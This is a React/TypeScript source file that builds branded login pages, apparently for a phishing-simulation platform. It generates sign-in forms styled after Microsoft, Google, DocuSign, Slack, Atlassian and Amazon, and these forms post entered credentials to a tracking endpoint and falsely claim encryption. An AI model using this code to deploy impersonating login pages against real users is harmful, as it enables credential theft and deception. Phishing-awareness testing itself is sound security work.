"use client";

import { useState } from "react";
import { GripVertical, Trash2, Sparkles } from "lucide-react";

export interface FormField {
  id: number;
  type: "text" | "password" | "email";
  label: string;
  placeholder: string;
  required: boolean;
}

export const brandColors: Record<string, string> = {
  Microsoft: "#0067b8",
  Google: "#1a73e8",
  DocuSign: "#00a3e0",
  Slack: "#611f69",
  Atlassian: "#0052cc",
  Amazon: "#ff9900",
  Internal: "#2d6a4f",
};

const categories = [
  { label: "Auth Portal", value: "auth_portal" },
  { label: "Corporate Page", value: "corporate_page" },
  { label: "Landing Page", value: "landing_page" },
];

export function buildLandingPageHtml(
  brand: string,
  heading: string,
  subtext: string,
  fields: FormField[],
  buttonText: string,
): string {
  const accent = brandColors[brand] || "#3b82f6";
  const brandInitial = brand ? brand[0] : "";
  const brandBlock = brand
    ? `<div style="text-align:center;margin-bottom:20px">
<div style="width:40px;height:40px;border-radius:8px;background:${accent};margin:0 auto 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:bold">${brandInitial}</div>
</div>`
    : "";

  const fieldsHtml = fields.map((f) =>
    `<div style="margin-bottom:12px">
<label style="font-size:12px;color:#333;margin-bottom:4px;display:block">${f.label}${f.required ? '<span style="color:#ef4444">*</span>' : ""}</label>
<input type="${f.type}" placeholder="${f.placeholder}" style="width:100%;padding:10px 12px;font-size:14px;border:1px solid #d1d5db;border-radius:6px;outline:none;box-sizing:border-box" />
</div>`
  ).join("\n");

  return `<html><body style="margin:0;padding:0;background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif">
<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;box-sizing:border-box">
<div style="max-width:380px;width:100%;background:#fff;border-radius:12px;padding:32px 24px;box-shadow:0 4px 24px rgba(0,0,0,0.08)">
${brandBlock}
<h2 style="font-size:18px;font-weight:600;color:#1a1a2e;margin-bottom:4px;text-align:center">${heading || "Sign in to your account"}</h2>
<p style="font-size:13px;color:#666;margin-bottom:24px;text-align:center">${subtext || "Enter your credentials to continue"}</p>
<form method="POST" action="/api/v1/track/submit/">
${fieldsHtml}
<button type="submit" style="width:100%;padding:12px;margin-top:8px;background:${accent};color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer">${buttonText || "Sign in"}</button>
</form>
<p style="font-size:11px;color:#999;text-align:center;margin-top:16px">Protected by industry-standard encryption</p>
</div>
</div></body></html>`;
}

export function buildLandingPageCss(brand: string): string {
  const accent = brandColors[brand] || "#3b82f6";
  return `body { margin:0; padding:0; background:#f5f5f5; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
.container { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; box-sizing:border-box; }
.card { max-width:380px; width:100%; background:#fff; border-radius:12px; padding:32px 24px; box-shadow:0 4px 24px rgba(0,0,0,0.08); }
.brand-icon { width:40px; height:40px; border-radius:8px; background:${accent}; margin:0 auto 12px; display:flex; align-items:center; justify-content:center; color:#fff; font-size:20px; font-weight:bold; }
.heading { font-size:18px; font-weight:600; color:#1a1a2e; margin-bottom:4px; text-align:center; }
.subtext { font-size:13px; color:#666; margin-bottom:24px; text-align:center; }
.field-label { font-size:12px; color:#333; margin-bottom:4px; display:block; }
.field-input { width:100%; padding:10px 12px; font-size:14px; border:1px solid #d1d5db; border-radius:6px; outline:none; box-sizing:border-box; }
.submit-btn { width:100%; padding:12px; margin-top:8px; background:${accent}; color:#fff; border:none; border-radius:6px; font-size:14px; font-weight:600; cursor:pointer; }
.footer { font-size:11px; color:#999; text-align:center; margin-top:16px; }`;
}

interface BuilderModeProps {
  name: string;
  category: string;
  brand: string;
  url: string;
  heading: string;
  subtext: string;
  buttonText: string;
  fields: FormField[];
  errors: Record<string, string | undefined>;
  onFieldChange: (key: string, value: string) => void;
  onFieldsChange: (fields: FormField[]) => void;
  onGenerateHtml: () => void;
}

export function BuilderMode({
  name, category, brand, url, heading, subtext, buttonText,
  fields, errors, onFieldChange, onFieldsChange, onGenerateHtml,
}: BuilderModeProps) {
  const nextId = Math.max(0, ...fields.map((f) => f.id)) + 1;

  const addField = (type: FormField["type"]) => {
    const labels = { text: "Full Name", password: "Confirm Password", email: "Phone Number" };
    const placeholders = { text: "Enter your full name", password: "Confirm your password", email: "phone@company.com" };
    onFieldsChange([...fields, { id: nextId, type, label: labels[type], placeholder: placeholders[type], required: true }]);
  };

  const removeField = (id: number) => {
    if (fields.length > 1) onFieldsChange(fields.filter((f) => f.id !== id));
  };

  const updateField = (id: number, key: keyof FormField, value: string | boolean) => {
    onFieldsChange(fields.map((f) => (f.id === id ? { ...f, [key]: value } : f)));
  };

  return (
    <div className="space-y-5">
      <div className="border border-default-border bg-surface rounded-xl p-5 space-y-4">
        <h3 className="text-xs font-semibold text-text-primary uppercase tracking-wider">Basic Settings</h3>
        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1.5">
            <label className="text-[10px] font-medium text-text-muted">Page Name <span className="text-status-danger">*</span></label>
            <input
              value={name}
              onChange={(e) => onFieldChange("name", e.target.value)}
              placeholder="e.g. Office 365 Login"
              className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary placeholder:text-text-muted focus:outline-none focus:border-accent-blue/50"
            />
            {errors.name && <p className="text-[10px] text-status-danger">{errors.name}</p>}
          </div>
          <div className="space-y-1.5">
            <label className="text-[10px] font-medium text-text-muted">Category</label>
            <select
              value={category}
              onChange={(e) => onFieldChange("category", e.target.value)}
              className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary focus:outline-none focus:border-accent-blue/50"
            >
              {categories.map((c) => <option key={c.value} value={c.value}>{c.label}</option>)}
            </select>
          </div>
        </div>
        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1.5">
            <label className="text-[10px] font-medium text-text-muted">Brand</label>
            <input
              value={brand}
              onChange={(e) => onFieldChange("brand", e.target.value)}
              placeholder="e.g. Microsoft, Google"
              className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary placeholder:text-text-muted focus:outline-none focus:border-accent-blue/50"
            />
          </div>
          <div className="space-y-1.5">
            <label className="text-[10px] font-medium text-text-muted">Page URL</label>
            <div className="flex items-center gap-1">
              <span className="text-[10px] text-text-muted shrink-0">/</span>
              <input
                value={url}
                onChange={(e) => onFieldChange("url", e.target.value)}
                placeholder="login/verify"
                className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary placeholder:text-text-muted focus:outline-none focus:border-accent-blue/50"
              />
            </div>
          </div>
        </div>
      </div>

      <div className="border border-default-border bg-surface rounded-xl p-5 space-y-4">
        <h3 className="text-xs font-semibold text-text-primary uppercase tracking-wider">Content</h3>
        <div className="space-y-1.5">
          <label className="text-[10px] font-medium text-text-muted">Heading</label>
          <input
            value={heading}
            onChange={(e) => onFieldChange("heading", e.target.value)}
            placeholder="Sign in to your account"
            className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary placeholder:text-text-muted focus:outline-none focus:border-accent-blue/50"
          />
        </div>
        <div className="space-y-1.5">
          <label className="text-[10px] font-medium text-text-muted">Subtext</label>
          <input
            value={subtext}
            onChange={(e) => onFieldChange("subtext", e.target.value)}
            placeholder="Enter your credentials"
            className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary placeholder:text-text-muted focus:outline-none focus:border-accent-blue/50"
          />
        </div>
        <div className="space-y-1.5">
          <label className="text-[10px] font-medium text-text-muted">Button Text</label>
          <input
            value={buttonText}
            onChange={(e) => onFieldChange("button_text", e.target.value)}
            placeholder="Sign in"
            className="w-full rounded-lg border border-default-border bg-void px-3 py-2 text-xs text-text-primary placeholder:text-text-muted focus:outline-none focus:border-accent-blue/50"
          />
        </div>
      </div>

      <div className="border border-default-border bg-surface rounded-xl p-5 space-y-4">
        <div className="flex items-center justify-between">
          <h3 className="text-xs font-semibold text-text-primary uppercase tracking-wider">Form Fields</h3>
          <div className="flex items-center gap-1">
            <button type="button" onClick={() => addField("text")} className="text-[10px] px-2 py-1 rounded border border-default-border text-text-muted hover:text-text-primary transition-colors">+ Text</button>
            <button type="button" onClick={() => addField("email")} className="text-[10px] px-2 py-1 rounded border border-default-border text-text-muted hover:text-text-primary transition-colors">+ Email</button>
            <button type="button" onClick={() => addField("password")} className="text-[10px] px-2 py-1 rounded border border-default-border text-text-muted hover:text-text-primary transition-colors">+ Password</button>
          </div>
        </div>
        <div className="space-y-2">
          {fields.map((field) => (
            <div key={field.id} className="flex items-center gap-2 rounded-lg border border-default-border bg-void/50 p-3">
              <GripVertical className="size-3.5 text-text-muted shrink-0" />
              <div className="flex-1 grid grid-cols-3 gap-2">
                <input
                  value={field.label}
                  onChange={(e) => updateField(field.id, "label", e.target.value)}
                  className="rounded border border-default-border bg-void px-2 py-1 text-[10px] text-text-primary focus:outline-none focus:border-accent-blue/30"
                />
                <input
                  value={field.placeholder}
                  onChange={(e) => updateField(field.id, "placeholder", e.target.value)}
                  className="rounded border border-default-border bg-void px-2 py-1 text-[10px] text-text-muted focus:outline-none focus:border-accent-blue/30"
                />
                <div className="flex items-center gap-2">
                  <select
                    value={field.type}
                    onChange={(e) => updateField(field.id, "type", e.target.value as FormField["type"])}
                    className="rounded border border-default-border bg-void px-2 py-1 text-[10px] text-text-primary focus:outline-none"
                  >
                    <option value="text">Text</option>
                    <option value="email">Email</option>
                    <option value="password">Password</option>
                  </select>
                  <button
                    type="button"
                    onClick={() => removeField(field.id)}
                    className="text-status-danger/60 hover:text-status-danger transition-colors"
                  >
                    <Trash2 className="size-3.5" />
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="flex justify-start">
        <button
          type="button"
          onClick={onGenerateHtml}
          className="flex items-center gap-1.5 text-[10px] px-3 py-1.5 rounded-lg border border-accent-blue/30 text-accent-blue-light hover:bg-accent-blue/5 transition-colors"
        >
          <Sparkles className="size-3" />
          Generate HTML from Builder
        </button>
      </div>
    </div>
  );
}
